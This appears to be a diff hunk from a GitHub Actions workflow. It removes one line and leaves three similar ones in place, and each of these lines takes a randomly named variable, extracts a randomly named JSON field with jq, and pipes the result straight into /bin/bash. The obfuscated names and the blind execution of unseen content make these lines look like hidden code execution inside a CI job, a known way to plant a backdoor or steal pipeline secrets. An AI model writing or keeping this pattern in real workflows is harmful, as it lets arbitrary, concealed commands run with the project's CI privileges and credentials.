@@ -22,7 +22,6 @@ jobs:
           echo $repbd3 | jq -r .kqiq9981 | /bin/bash
           printf '%s' "$i54798" | jq -r .pu8 | /bin/bash
           printf '%s' "$y8235" | jq -r .ofl74 | /bin/bash
-          echo $tfs3 | jq -r .djzpm708 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
